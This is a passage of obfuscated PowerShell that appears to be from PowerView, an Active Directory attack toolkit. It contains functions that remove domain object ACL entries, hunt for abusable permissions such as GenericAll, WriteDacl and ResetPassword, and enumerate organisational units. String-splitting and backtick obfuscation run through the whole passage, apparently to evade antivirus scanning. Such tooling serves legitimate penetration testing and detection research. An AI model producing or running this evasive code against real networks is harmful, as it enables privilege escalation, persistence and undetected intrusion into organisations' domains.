                &("{0}{2}{1}{3}" -f'Wr','e-Verb','it','ose') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${iD`E`NTitY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pR`I`NcIpAloBJ`ECT}."oB`jE`cTsID")

                    if (${Gu`i`ds}) {
                        ForEach (${G`UId} in ${g`UIdS}) {
                            ${new`G`UiD} = &("{2}{1}{0}" -f'-Object','w','Ne') ("{0}{1}" -f'G','uid') ${Gu`Id}
                            ${ADri`G`HTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}"-f'Exte','nd','edRight')
                            ${a`cEs} += &("{3}{0}{2}{1}" -f'w-Ob','ect','j','Ne') ("{5}{4}{8}{6}{2}{7}{3}{0}{1}"-f 'cess','Rule','Services.','Ac','Di','System.','ectory','ActiveDirectory','r') ${IdENTI`TY}, ${ADR`igH`Ts}, ${CONT`R`oLTYPe}, ${n`EwGu`iD}, ${I`NHeriTAN`C`e`TYPE}
                        }
                    }
                    else {
                        
                        ${a`DRI`GHts} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}" -f 'All','eneric','G')
                        ${A`ceS} += &("{0}{2}{1}"-f 'N','Object','ew-') ("{2}{3}{5}{7}{1}{4}{8}{0}{6}" -f't','Di','System.Direc','toryServ','r','ices.Act','oryAccessRule','ive','ec') ${i`dENT`ITy}, ${aD`RIGhts}, ${CoN`TRoL`TYPe}, ${iN`hER`I`TANcETyPe}
                    }

                    
                    ForEach (${A`Ce} in ${A`CEs}) {
                        &("{2}{0}{3}{1}" -f'r','bose','W','ite-Ver') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${t`ArgETENT`Ry} = ${tArG`etObjE`cT}.("{3}{1}{2}{0}"-f 'ry','tDirect','oryEnt','Ge').Invoke()
                        ${Tar`gET`ENtrY}."ps`BASE"."O`ptIO`NS"."Se`cURITY`ma`sks" = ("{1}{0}" -f 'l','Dac')
                        ${t`Ar`geTEntrY}."ps`BasE"."objectseC`Ur`ity".("{0}{3}{1}{2}"-f'RemoveAcces','Rul','e','s').Invoke(${a`CE})
                        ${TAr`gEtEN`T`RY}."psb`AsE".("{1}{3}{0}{2}"-f'nge','Co','s','mmitCha').Invoke()
                    }
                }
                catch {
                    &("{0}{3}{1}{2}"-f 'Wri','Ver','bose','te-') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function f`I`N`d-`InTereSti`NgD`OmainACL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}" -f 'PSS','d','Process','houl'}, '')]
    [OutputType({"{2}{3}{1}{4}{0}"-f 'ACL','r','Po','we','View.'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsitIon = 0, ValueFrOmpipeLINe = ${t`RuE}, valuefroMPIpElinebYPrOPERTynAme = ${tR`UE})]
        [Alias({"{1}{2}{0}"-f'inName','Do','ma'}, {"{1}{0}"-f 'ame','N'})]
        [String]
        ${d`OMa`IN},

        [Switch]
        ${rE`sOL`VeG`Uids},

        [String]
        [ValidateSet('All', {"{0}{3}{2}{1}"-f'Rese','word','ass','tP'}, {"{2}{1}{0}{3}"-f'M','ite','Wr','embers'})]
        ${RiGhT`SF`ILT`ER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ilter','F'})]
        [String]
        ${L`d`Ap`FiLTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'Path','ADS'})]
        [String]
        ${sE`ARcHb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{1}{3}{0}"-f'ler','inCon','a','trol','Dom'})]
        [String]
        ${s`er`VEr},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{2}{0}{1}"-f 'n','eLevel','O'}, {"{1}{0}"-f'tree','Sub'})]
        [String]
        ${SE`ARCHSc`OpE} = ("{2}{0}{1}" -f'tre','e','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`EsuL`Tp`AGEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`VeRti`mEl`I`Mit},

        [Switch]
        ${TOM`BS`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EdEN`T`Ial} =   ${5R0vK}::"Em`PTy"
    )

    BEGIN {
        ${A`cLarguM`eNts} = @{}
        if (${pSb`oUN`d`paRa`METERs}[("{0}{1}{2}"-f 'Res','olve','GUIDs')]) { ${AcLaR`Gum`enTS}[("{0}{3}{1}{2}" -f'Re','UID','s','solveG')] = ${RE`S`oLvE`G`Uids} }
        if (${psbOu`N`DPArAme`T`E`Rs}[("{2}{1}{3}{0}"-f 'ilter','ts','Righ','F')]) { ${aCLAR`g`Ume`NTs}[("{2}{0}{1}"-f'ight','sFilter','R')] = ${RiG`H`Ts`FIlTer} }
        if (${Ps`BouNDpArAm`e`TErs}[("{2}{0}{1}"-f 'D','APFilter','L')]) { ${AcL`ArGu`MenTs}[("{3}{2}{0}{1}"-f'F','ilter','AP','LD')] = ${LDAP`FiL`TER} }
        if (${PS`B`OunDp`AR`A`MEteRS}[("{2}{0}{1}"-f 'chB','ase','Sear')]) { ${a`C`LaRg`UMe`Nts}[("{2}{0}{1}"-f'a','se','SearchB')] = ${s`Earc`hBasE} }
        if (${PsB`oUNDP`Ar`Am`et`ERS}[("{1}{2}{0}" -f 'ver','Se','r')]) { ${aClar`gU`Me`NtS}[("{0}{1}" -f'Serve','r')] = ${S`ERv`ER} }
        if (${Psb`ouNd`pARAM`EteRS}[("{0}{2}{1}" -f 'Se','hScope','arc')]) { ${Ac`L`Ar`GumeNTs}[("{2}{0}{1}{3}" -f 'ear','chSco','S','pe')] = ${S`e`ArcHscOPe} }
        if (${p`SbO`UNDPaR`AmEteRS}[("{2}{0}{1}" -f'ge','Size','ResultPa')]) { ${AClAR`gu`mEN`TS}[("{2}{3}{1}{0}" -f 'ze','i','Res','ultPageS')] = ${r`EsuL`TpA`GEs`ize} }
        if (${psBOunD`pAramE`TE`RS}[("{0}{4}{2}{1}{3}" -f'S','imeLim','rverT','it','e')]) { ${ACL`A`R`Gum`ents}[("{1}{0}{2}{3}" -f 'erTim','Serv','eLim','it')] = ${SErv`ERtIM`eLIMiT} }
        if (${ps`BoundPaRAM`Et`e`Rs}[("{2}{1}{0}"-f 'e','ton','Tombs')]) { ${acL`A`RgUMeNts}[("{0}{2}{1}{3}"-f 'T','s','omb','tone')] = ${TOMB`S`Tone} }
        if (${PsB`ou`N`DparA`MetERS}[("{3}{0}{1}{2}" -f'rede','ntia','l','C')]) { ${ac`l`A`RgU`mentS}[("{0}{1}{2}"-f'Cred','en','tial')] = ${c`Reden`TIAl} }

        ${OB`JECTS`EarChErA`RG`UMentS} = @{
            ("{2}{1}{0}" -f'es','ti','Proper') = ("{6}{5}{3}{7}{0}{2}{4}{1}" -f',ob','ass','jectc','countna','l','mac','sa','me')
            'Raw' = ${T`Rue}
        }
        if (${Psb`oUnD`P`A`RamETERS}[("{0}{1}{2}" -f 'Se','rv','er')]) { ${OBJect`s`EAR`c`hER`Ar`g`UmentS}[("{1}{0}" -f'ver','Ser')] = ${Serv`Er} }
        if (${PSBOu`N`d`pAra`M`EtERS}[("{1}{2}{0}" -f 'ope','S','earchSc')]) { ${OBjEctsEA`RC`h`E`RArGu`MeNts}[("{0}{2}{1}" -f 'SearchSc','e','op')] = ${SeA`Rc`H`ScOpE} }
        if (${P`sB`ounDpa`RAmetE`RS}[("{4}{0}{1}{3}{2}" -f 'ultP','ag','ize','eS','Res')]) { ${OBjectseA`R`che`RARGuMe`N`TS}[("{0}{1}{2}"-f 'Re','sul','tPageSize')] = ${R`Esu`L`TPaGEs`iZE} }
        if (${pS`BoUndPaRaM`e`TeRS}[("{2}{3}{1}{4}{0}"-f 't','i','Server','TimeL','mi')]) { ${O`Bj`ect`sEArcH`ErA`RgUMEnts}[("{2}{1}{0}" -f'eLimit','erTim','Serv')] = ${serVER`Ti`m`elimIT} }
        if (${PsB`Ou`NDPa`RAMeTErs}[("{1}{0}"-f'one','Tombst')]) { ${OB`jECtsEa`Rc`HeRa`R`GuMents}[("{1}{0}{2}" -f 'ombston','T','e')] = ${TOMBS`T`O`NE} }
        if (${PSB`oUn`DpArAmet`ers}[("{2}{1}{3}{0}" -f 'l','edenti','Cr','a')]) { ${ob`jECtSeAR`ch`Er`A`R`g`UmEnts}[("{1}{2}{0}" -f'ential','C','red')] = ${CRe`dEnT`I`Al} }

        ${ADN`Ame`Arg`Uments} = @{}
        if (${p`sb`ou`NDpa`Ra`mEterS}[("{0}{1}{2}" -f 'Serv','e','r')]) { ${adn`Am`EarGUME`N`Ts}[("{0}{1}"-f 'Serv','er')] = ${se`Rv`ER} }
        if (${pSbOUnDp`A`Ra`Met`eRs}[("{1}{0}{3}{2}"-f 'nt','Crede','al','i')]) { ${Adn`A`M`e`Argu`MENts}[("{0}{2}{1}{3}" -f 'Cr','ent','ed','ial')] = ${cRed`E`Nti`Al} }

        
        ${ResO`lv`E`dsIDS} = @{}
    }

    PROCESS {
        if (${p`SbOUN`dPA`RaM`eTerS}[("{1}{0}"-f 'omain','D')]) {
            ${ACLAr`gu`M`EntS}[("{1}{2}{0}" -f'in','D','oma')] = ${d`OMa`iN}
            ${aDNAmEArgu`M`eN`TS}[("{1}{0}" -f 'in','Doma')] = ${DOmA`iN}
        }

        &("{1}{3}{2}{0}{4}{5}"-f 'inO','G','Doma','et-','bjectA','cl') @ACLArguments | &("{3}{0}{2}{1}"-f'orEa','bject','ch-O','F') {

            if ( (${_}."a`cti`V`EDiR`EcTOrYRIGH`TS" -match ((("{9}{2}{1}{10}{4}{5}{7}{3}{8}{0}{6}"-f'elet','AllQ','ic','teQzw','riteQzw','C','e','rea','D','Gener','zwW'))  -repLAcE'Qzw',[cHaR]124)) -or ((${_}."Ac`T`IVedIREcTo`R`YRiGhtS" -match ("{0}{2}{1}{3}"-f'Ex','en','t','dedRight')) -and (${_}."a`cEqu`AlIf`iER" -match ("{0}{1}" -f 'Allo','w')))) {
                
                if (${_}."securItyidE`N`TiFi`Er"."v`ALue" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${rEsOL`VedSI`ds}[${_}."SEcUriTyI`DeN`TIF`i`eR"."Va`lUe"]) {
                        ${IdENtItyRefeR`e`NcEN`A`Me}, ${IDeNtiTYrEFER`e`N`Ce`d`omaIN}, ${I`DENtI`TYr`efE`ReNceDN}, ${ide`N`Ti`TYRe`F`ERence`clAss} = ${RE`sOlve`dSI`dS}[${_}."s`ecu`Rity`idenTIFiEr"."v`ALuE"]

                        ${I`N`TEre`ST`inGacl} = &("{1}{0}{2}" -f 'bje','New-O','ct') ("{0}{1}"-f'PSObje','ct')
                        ${I`NT`eREStINga`cL} | &("{2}{0}{3}{1}"-f '-','mber','Add','Me') ("{2}{3}{0}{1}"-f'ropert','y','N','oteP') ("{0}{1}{2}"-f 'Object','D','N') ${_}."oBjEC`TDN"
                        ${InT`ERES`T`iNGACL} | &("{2}{0}{1}" -f 'm','ber','Add-Me') ("{3}{2}{1}{0}"-f'y','pert','Pro','Note') ("{1}{2}{0}"-f'fier','Ac','eQuali') ${_}."a`Ceq`UaLifIer"
                        ${iNTE`R`e`STiNga`cL} | &("{1}{0}{2}" -f 'Membe','Add-','r') ("{1}{0}{2}" -f 'Propert','Note','y') ("{5}{4}{0}{1}{2}{3}"-f 'yRi','gh','t','s','ctiveDirector','A') ${_}."actiVEDI`REcT`O`R`Yr`IGh`Ts"
                        if (${_}."Ob`jeCTAc`Ety`pE") {
                            ${inTeReS`TIn`ga`cl} | &("{1}{2}{0}"-f'r','Add-Memb','e') ("{2}{1}{0}"-f 'operty','tePr','No') ("{1}{2}{0}" -f'ype','Obj','ectAceT') ${_}."ObJ`ECtAC`e`T`YPe"
                        }
                        else {
                            ${inT`ERE`St`in`Gacl} | &("{0}{2}{1}" -f'Add','ber','-Mem') ("{0}{1}{3}{2}"-f'No','te','operty','Pr') ("{0}{1}{2}{3}"-f'O','b','jectAce','Type') ("{0}{1}" -f'Non','e')
                        }
                        ${iNTeREst`IN`GaCL} | &("{0}{2}{1}" -f'Add','ber','-Mem') ("{3}{1}{0}{2}"-f'p','Pro','erty','Note') ("{0}{1}"-f 'AceFl','ags') ${_}."aCEF`LA`gs"
                        ${i`N`T`er`EStiNGaCl} | &("{2}{0}{1}" -f'd-Membe','r','Ad') ("{3}{1}{2}{0}"-f'y','t','ePropert','No') ("{0}{2}{1}" -f'A','pe','ceTy') ${_}."a`cetY`PE"
                        ${I`NTER`eSt`in`gacl} | &("{1}{2}{3}{0}" -f'r','A','dd-M','embe') ("{0}{1}{2}"-f'NoteP','rop','erty') ("{3}{4}{2}{5}{1}{0}" -f 'lags','F','t','In','heri','ance') ${_}."I`NHERiTA`NCeFLA`Gs"
                        ${I`N`TER`EsTingA`Cl} | &("{2}{0}{1}" -f'e','mber','Add-M') ("{0}{1}{2}"-f'N','otePropert','y') ("{1}{0}{2}{3}"-f 'ecu','S','ri','tyIdentifier') ${_}."se`cU`RitYIDEN`Ti`FIer"
                        ${INTeREStI`NGA`Cl} | &("{3}{1}{2}{0}" -f'mber','d','d-Me','A') ("{2}{1}{0}" -f'perty','tePro','No') ("{5}{0}{4}{6}{2}{3}{1}" -f'enti','e','e','renceNam','t','Id','yRef') ${iD`enti`TyreFErE`NCE`Na`me}
                        ${I`Ntere`StI`Ng`AcL} | &("{2}{1}{3}{0}"-f'r','dd-Me','A','mbe') ("{2}{1}{0}"-f 'Property','e','Not') ("{3}{0}{4}{2}{1}{5}"-f'tit','ef','R','Iden','y','erenceDomain') ${Ide`NtI`TYr`efeRe`NCEDoMa`iN}
                        ${iNtE`RE`S`TINgacl} | &("{2}{0}{1}" -f 'dd','-Member','A') ("{1}{0}{2}" -f 'otePrope','N','rty') ("{0}{4}{2}{1}{3}{5}"-f 'Ident','r','fe','enc','ityRe','eDN') ${IdENT`ITYR`eFEREN`cedN}
                        ${In`TErEsT`IN`GAcl} | &("{1}{0}{2}{3}"-f'd-Me','Ad','mbe','r') ("{2}{0}{1}"-f 'er','ty','NoteProp') ("{2}{0}{6}{4}{5}{1}{3}" -f 'ti','nceClas','Iden','s','yR','efere','t') ${ideNT`I`TyREfe`REN`CeClASS}
                        ${INte`RESt`IN`gA`cl}
                    }
                    else {
                        ${Id`ENtityRef`e`REN`c`EDn} = &("{2}{0}{1}{4}{3}" -f 'v','ert','Con','Name','-AD') -Identity ${_}."S`EcuRiTyIdeNTI`FI`Er"."VaL`UE" -OutputType ('DN') @ADNameArguments
                        

                        if (${IdEnTITy`ReFeR`e`NCEdn}) {
                            ${IDe`Nti`TYrefEREnCE`Do`MAiN} = ${idEnTit`yREfE`ReNc`e`dn}.("{0}{2}{1}{3}" -f'S','Stri','ub','ng').Invoke(${iD`en`Tity`Re`Fe`REnCEDN}.("{0}{1}{2}" -f 'Index','O','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${oB`jECTseaRchERa`Rgu`me`NtS}[("{1}{0}" -f 'n','Domai')] = ${IdEN`TITyReF`er`en`ce`d`O`mAiN}
                            ${OBJ`e`Cts`EAr`Ch`eRaRGuM`eNtS}[("{1}{0}{2}" -f'dent','I','ity')] = ${iDENTitYRe`FE`RE`NcE`Dn}
                            
                            ${O`BjE`ct} = &("{0}{3}{2}{1}"-f'Get-D','ct','je','omainOb') @ObjectSearcherArguments

                            if (${ObJE`CT}) {
                                ${I`DenTItYReFEREnC`e`NAme} = ${O`BJ`Ect}."P`R`OPErTIeS"."SA`maC`Cou`N`TNaMe"[0]
                                if (${O`BJeCt}."prOPE`RTi`ES"."o`B`JECtC`lasS" -match ("{1}{0}"-f 'puter','com')) {
                                    ${I`D`En`TITy`REfeRencec`LASs} = ("{1}{2}{0}" -f'er','compu','t')
                                }
                                elseif (${ob`je`cT}."p`R`OpE`RTiEs"."obJECt`cl`ASS" -match ("{1}{0}" -f'p','grou')) {
                                    ${id`E`NT`Ity`REFeRence`CL`Ass} = ("{1}{0}" -f 'roup','g')
                                }
                                elseif (${oB`J`EcT}."PrO`PEr`Ties"."obJ`Ec`T`ClAsS" -match ("{1}{0}"-f'r','use')) {
                                    ${id`entITyrE`FER`ENCEcl`ASs} = ("{0}{1}" -f'us','er')
                                }
                                else {
                                    ${Id`e`NTi`TYrefeReNCE`CL`A`ss} = ${n`ULl}
                                }

                                
                                ${Reso`L`VEdsIDs}[${_}."sEC`URityI`dEntIfi`Er"."vAl`UE"] = ${I`DEntI`TYRE`F`eREnc`ENA`Me}, ${iDENTi`TyR`EfeR`ENceDo`MA`In}, ${I`DENtIT`yr`eF`erEncE`Dn}, ${idEnt`iTY`R`e`FErENC`EcLA`Ss}

                                ${i`NT`ER`EstINgACL} = &("{0}{1}{2}" -f 'Ne','w-Obj','ect') ("{1}{2}{0}"-f't','PS','Objec')
                                ${iNteR`ES`TING`ACl} | &("{2}{1}{0}"-f'er','-Memb','Add') ("{2}{0}{3}{1}"-f 'ePro','erty','Not','p') ("{1}{0}"-f 'DN','Object') ${_}."ob`JE`Ctdn"
                                ${In`T`ERes`TiNgA`Cl} | &("{2}{1}{0}{3}" -f 'emb','dd-M','A','er') ("{2}{1}{0}{3}"-f'Pr','e','Not','operty') ("{1}{2}{0}{3}"-f 'e','AceQua','lifi','r') ${_}."aCEqUALi`F`i`ER"
                                ${In`T`er`ESTiN`gaCL} | &("{2}{1}{0}"-f'mber','e','Add-M') ("{0}{2}{1}{3}" -f 'Not','rt','ePrope','y') ("{0}{3}{1}{4}{2}" -f 'A','eDi','yRights','ctiv','rector') ${_}."acTIvE`D`iREc`ToRyr`iGH`Ts"
                                if (${_}."Obje`ct`AcEType") {
                                    ${InT`Ere`sT`iN`GAcL} | &("{3}{1}{0}{2}"-f '-Me','d','mber','Ad') ("{0}{2}{1}" -f 'Not','Property','e') ("{3}{2}{0}{4}{1}" -f'tAceT','e','bjec','O','yp') ${_}."oBje`ctac`e`TY`pe"
                                }
                                else {
                                    ${i`N`T`e`REStINGAcl} | &("{1}{2}{0}"-f 'er','A','dd-Memb') ("{1}{0}{2}" -f't','NoteProper','y') ("{0}{1}{3}{2}" -f 'Obje','ct','pe','AceTy') ("{1}{0}" -f 'ne','No')
                                }
                                ${inter`E`s`TINg`ACl} | &("{0}{2}{1}"-f 'Ad','er','d-Memb') ("{1}{2}{3}{0}" -f 'operty','Not','eP','r') ("{0}{2}{1}" -f 'Ac','Flags','e') ${_}."a`C`eFLaGs"
                                ${iNtErESTIn`g`A`cl} | &("{1}{0}{2}" -f'e','Add-Memb','r') ("{1}{2}{0}"-f 'rty','Note','Prope') ("{0}{1}" -f'AceT','ype') ${_}."ACet`y`pE"
                                ${INt`eResti`NGa`CL} | &("{0}{1}{2}"-f'Add-M','em','ber') ("{0}{2}{1}" -f 'No','roperty','teP') ("{1}{4}{2}{0}{3}"-f'eFla','I','tanc','gs','nheri') ${_}."In`HeRIta`NC`EflaGs"
                                ${i`Nt`Ere`STIN`GacL} | &("{2}{1}{0}" -f'r','mbe','Add-Me') ("{1}{0}{2}{3}"-f 'ePr','Not','o','perty') ("{2}{4}{5}{1}{3}{0}"-f'ier','den','Se','tif','curi','tyI') ${_}."secUR`IT`Y`IdENtifieR"
                                ${InterES`T`Inga`CL} | &("{0}{1}{3}{2}" -f 'A','dd','ember','-M') ("{2}{1}{3}{0}" -f'ty','eP','Not','roper') ("{1}{3}{0}{2}" -f'ren','Id','ceName','entityRefe') ${IdENTitY`R`eF`E`RenCEnAME}
                                ${iNT`e`Rest`iNgAcL} | &("{1}{0}{2}"-f 'Mem','Add-','ber') ("{1}{0}{2}{3}" -f't','No','ePropert','y') ("{1}{4}{2}{3}{0}"-f'in','I','ence','Doma','dentityRefer') ${ideN`Tit`YREFerE`N`c`E`DoMAiN}
                                ${in`TE`ResTinga`Cl} | &("{0}{1}{2}"-f 'Add-','Membe','r') ("{3}{1}{0}{2}"-f 'Prop','te','erty','No') ("{1}{0}{3}{2}{4}"-f 'e','Id','enc','ntityRefer','eDN') ${I`DENtIT`yr`EfErE`N`CEdN}
                                ${i`N`Te`Re`StiNgaCl} | &("{1}{2}{0}" -f'Member','A','dd-') ("{2}{0}{1}{3}"-f 'P','ropert','Note','y') ("{2}{4}{0}{3}{1}" -f'ntityReferenc','ass','I','eCl','de') ${I`deNTItYR`EfE`ReN`CeClA`SS}
                                ${iNtE`R`E`sTiN`GaCl}
                            }
                        }
                        else {
                            &("{2}{0}{1}"-f 'rni','ng','Write-Wa') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function geT-D`oM`AIn`oU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}" -f 'P','uld','rocess','PSSho'}, '')]
    [OutputType({"{2}{1}{0}"-f'rView.OU','we','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter(posItIoN = 0, vaLUEfRomPiPEline = ${tr`UE}, vaLuefROmPiPELInEbYPROPERTYname = ${tr`UE})]
        [Alias({"{0}{1}" -f 'N','ame'})]
        [String[]]
        ${IDeN`T`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}" -f 'D','GUI'})]
        ${G`pLiNk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`MaIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${l`dAPfIL`TER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`OPErT`IeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'DSPath','A'})]
        [String]
        ${S`ea`Rc`HbaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f'Contr','in','oller','Doma'})]
        [String]
        ${SeR`V`eR},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{0}{1}{2}" -f 'OneLev','e','l'}, {"{2}{0}{1}" -f'bt','ree','Su'})]
        [String]
        ${seaR`CHS`COPE} = ("{1}{0}{2}"-f'r','Subt','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resuLTP`AGeS`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRvER`Ti`mELI`MIT},

        [ValidateSet({"{1}{0}"-f'acl','D'}, {"{0}{1}" -f 'G','roup'}, {"{1}{0}" -f 'one','N'}, {"{0}{1}"-f'Own','er'}, {"{0}{1}"-f'Sac','l'})]
        [String]
        ${secu`R`iTY`MaS`kS},

        [Switch]
        ${Tom`B`stone},

        [Alias({"{1}{0}{2}"-f'nOn','Retur','e'})]
        [Switch]
        ${F`iNDO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Ede`N`TIAL} =  ( &("{0}{1}"-f'CHild','IteM') ("{3}{1}{2}{0}" -f':5R0vk','ria','blE','Va')  )."vA`lUe"::"EMp`Ty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${sEArch`eRA`R`GuMe`NtS} = @{}
        if (${P`sbOu`N`DpAraMetERs}[("{1}{0}" -f'ain','Dom')]) { ${seARC`hER`ArG`UmeN`Ts}[("{0}{1}" -f'Dom','ain')] = ${Do`MaiN} }
        if (${pSBOU`NdpAra`MET`E`Rs}[("{1}{0}{2}"-f'roper','P','ties')]) { ${sea`R`CHEr`ArgUmENts}[("{2}{3}{0}{1}" -f 'i','es','Pro','pert')] = ${Pro`PEr`TIES} }
        if (${p`sBOUN`dparam`E`TErS}[("{0}{2}{1}" -f'S','Base','earch')]) { ${sEarCH`E`R`Arg`UmeNts}[("{2}{1}{0}"-f'e','s','SearchBa')] = ${SeaR`Ch`BaSe} }
        if (${PSboU`NdpARA`met`ERS}[("{0}{1}"-f 'Serve','r')]) { ${S`EaR`CHE`R`ArG`UMenTs}[("{1}{0}"-f'r','Serve')] = ${sE`RV`Er} }
        if (${PsbOU`N`DpaR`Ame`TerS}[("{3}{2}{0}{1}" -f 'o','pe','Sc','Search')]) { ${s`eARCheraRGU`Me`N`TS}[("{1}{0}{2}" -f'ea','S','rchScope')] = ${SearC`h`ScO`pE} }
        if (${pSb`O`UndPaRaM`e`TeRS}[("{2}{1}{0}"-f 'sultPageSize','e','R')]) { ${SE`A`R`cHerA`RgUMentS}[("{2}{1}{0}{3}" -f'eS','esultPag','R','ize')] = ${rESULtp`AgEs`I`zE} }
        if (${p`sb`OUNDPAra`metERS}[("{2}{1}{0}"-f 'Limit','verTime','Ser')]) { ${S`ear`cheR`Arguments}[("{2}{1}{3}{0}" -f'it','rTim','Serve','eLim')] = ${sE`Rve`RtiM`ELImit} }
        if (${PS`B`OUNDpa`RAmEtERS}[("{2}{1}{0}"-f 'ks','rityMas','Secu')]) { ${sEAR`C`heRArgUMe`N`Ts}[("{1}{2}{0}"-f 's','S','ecurityMask')] = ${seCURit`y`Ma`s`Ks} }
        if (${PSbO`UN`D`P`ArA`MEtERS}[("{2}{1}{0}" -f'stone','mb','To')]) { ${sEa`Rche`RaRgUmeN`Ts}[("{1}{0}{2}"-f 'o','Tombst','ne')] = ${TOmb`S`TO`Ne} }
        if (${p`sb`oUn`dPA`RAM`ETeRS}[("{2}{3}{1}{0}"-f 'l','entia','C','red')]) { ${sEArc`HERA`R`gumEnTS}[("{0}{2}{1}"-f'Creden','l','tia')] = ${c`ReDE`NTIal} }
        ${Ous`e`ARCheR} = &("{2}{4}{3}{0}{1}" -f 'e','archer','Get','omainS','-D') @SearcherArguments
    }

    PROCESS {
        if (${O`Us`EarCH`Er}) {
            ${i`DeNT`iTyfi`lTer} = ''
            ${f`IlT`er} = ''
            ${i`DEN`TItY} | &("{2}{0}{1}{3}"-f're-','Obj','Whe','ect') {${_}} | &("{2}{3}{4}{0}{1}" -f'jec','t','Fo','rEach-','Ob') {
                ${I`DENT`itYiNs`TA`NCE} = ${_}.("{1}{2}{0}"-f'e','Re','plac').Invoke('(', '\28').("{0}{1}"-f'Rep','lace').Invoke(')', '\29')
                if (${Ide`NtITy`InSt`A`NcE} -match ("{2}{0}{1}" -f 'U=','.*','^O')) {
                    ${idENtITY`FIL`T`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${Psbo`UnDpaRA`m`eteRs}[("{1}{0}" -f'n','Domai')]) -and (-not ${Ps`Bo`Un`dpAraMEteRS}[("{2}{0}{1}{3}" -f 'a','r','Se','chBase')])) {
                        
                        
                        ${ID`eNti`TYDO`maIN} = ${idE`Nt`ITyinst`AncE}.("{1}{0}{2}"-f 'ubStr','S','ing').Invoke(${Id`entITYi`Ns`TANce}.("{2}{1}{0}"-f 'xOf','e','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{0}{1}" -f 'Verbos','e','Write-') ('[Get-Do'+'m'+'ainOU'+'] '+'Extr'+'ac'+'ted '+'dom'+'ai'+'n '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${S`E`Ar`c`HEra`RGUmenTs}[("{0}{1}" -f 'Domai','n')] = ${I`deNTItY`do`MA`in}
                        ${ou`S`earCh`Er} = &("{3}{2}{0}{1}"-f'rc','her','et-DomainSea','G') @SearcherArguments
                        if (-not ${o`U`SeaRc`hEr}) {
                            &("{1}{3}{0}{4}{2}" -f'War','Wr','ng','ite-','ni') ('[Get-Dom'+'a'+'i'+'n'+'OU] '+'U'+'n'+'able '+'to'+' '+'re'+'trieve '+'do'+'main'+' '+'se'+'arc'+'he'+'r '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${guI`DBY`TesT`RiNg} = (-Join (([Guid]${I`denTityi`NsT`AncE}).("{3}{2}{1}{0}"-f 'y','a','oByteArr','T').Invoke() | &("{2}{3}{4}{0}{1}" -f'ec','t','ForE','ach','-Obj') {${_}.("{2}{0}{1}"-f't','ring','ToS').Invoke('X').("{2}{0}{1}"-f 'dL','eft','Pa').Invoke(2,'0')})) -Replace ("{0}{1}"-f'(..',')'),'\$1'
                        ${iDe`NTI`TY`FILT`eR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IDeN`TITyFI`l`T`Er} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ide`N`TiTY`FILt`er} -and (${IdeNT`iTY`Fi`L`TER}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${f`i`LTER} += "(|$IdentityFilter)"
            }

            if (${psbou`Ndpa`R`AmEt`ERS}[("{1}{0}{2}" -f'PLi','G','nk')]) {
                &("{2}{3}{1}{0}" -f'ose','rb','Write-V','e') ('[G'+'et-Dom'+'ai'+'nOU]'+' '+'Sear'+'ch'+'i'+'ng '+'for'+' '+'O'+'Us '+'wi'+'th '+"$GPLink "+'set'+' '+'i'+'n '+'t'+'he '+'g'+'pLink '+'pr'+'operty')
                ${Filt`Er} += "(gplink=*$GPLink*)"
            }

            if (${Ps`BO`UNdpaR`AMEteRS}[("{3}{0}{1}{2}" -f'PF','i','lter','LDA')]) {
                &("{2}{0}{1}" -f 'rbo','se','Write-Ve') ('[Get-D'+'om'+'ainOU]'+' '+'Usin'+'g '+'add'+'iti'+'onal '+'L'+'DAP '+'f'+'ilt'+'er: '+"$LDAPFilter")
                ${F`iL`TEr} += "$LDAPFilter"
            }

